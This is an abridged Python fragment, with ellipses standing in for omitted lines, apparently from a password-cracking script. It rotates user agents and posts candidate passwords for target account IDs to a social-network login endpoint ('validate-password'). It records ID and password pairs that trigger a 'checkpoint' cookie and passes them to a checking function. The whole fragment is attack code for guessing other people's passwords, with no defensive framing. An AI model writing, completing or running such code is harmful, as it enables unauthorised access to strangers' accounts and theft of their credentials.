...
ugen2=[]
ugen=[]
ugen3=open('fii/ua.txt','r').read().splitlines()
try:
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
